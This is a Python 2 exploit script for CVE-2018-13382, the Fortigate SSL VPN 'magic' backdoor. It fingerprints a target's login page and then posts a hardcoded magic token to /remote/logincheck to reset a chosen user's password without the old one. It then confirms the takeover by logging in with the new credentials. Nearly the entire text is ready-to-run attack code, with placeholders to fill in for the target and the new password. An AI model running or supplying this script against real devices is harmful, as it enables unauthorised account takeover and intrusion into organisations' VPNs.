#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Author : w4rl0k
# CVE-2018-13382 : Magic backdoor Fortigate
# Allow to change the password of a user
# The exploit do not work on radius account

import requests

userAgent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36" # Chrome 44
username="test" # put a login used on Fortigate, an unknow login do not work
newpassword="test" # put the new password you want to use
ip="localhost:10443"

def checkIP():
	try:
		headers = {"User-Agent": userAgent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
		r=requests.get("https://"+ip+"/remote/login?lang=en", headers=headers, verify=False)
		if r.status_code == 200 and "<title>Please Login</title>" in r.text:
			return True
	except:
		pass
	return False

def changePassword():
	try:
		headers = {"User-Agent": userAgent, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://"+ip+"/remote/login?lang=en", "Pragma": "no-cache", "Cache-Control": "no-store, no-cache, must-revalidate", "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8", "Connection": "close"}
		data = {"ajax": "1", "username": username, "realm": '', "credential": newpassword, "magic": "4tinet2095866", "reqid": "0", "credential2": newpassword}
		r=requests.post("https://"+ip+"/remote/logincheck", headers=headers, data=data, verify=False)
		if r.status_code == 200 and 'redir=/remote/hostcheck_install' in r.text:
			return True
	except:
		pass
	return False

def checkLogin():
	try:
		headers = {"User-Agent": userAgent, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://"+ip+"/remote/login?lang=en", "Pragma": "no-cache", "Cache-Control": "no-store, no-cache, must-revalidate", "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8", "Connection": "close"}
		data = {"ajax": "1", "username": username, "realm": '', "credential": newpassword}
		r=requests.post("https://"+ip+"/remote/logincheck", headers=headers, data=data, verify=False)
		if r.status_code==200 and"redir=/remote/hostcheck_install" in r.text:
			return True
	except:
		pass
	return False

def main():
	if checkIP():
		print "[*] Target ["+ip+"] is a Fortigate device"
		if changePassword():
			print "[*] Using the magic keyword to change password for: ["+username+"]"	
			if checkLogin():
				print "[*] Access successful with new credentials ["+username+"|"+newpassword+"]"
			else:
				print "[*] Failled to access with new credentials ["+username+"|"+newpassword+"]"
		else:
			print "[*] Failled to change password with the magic keyword for: ["+username+"]"			
	else:
		print "[*] Target ["+ip+"] is not a Fortigate device"

if __name__ == "__main__":
	main()
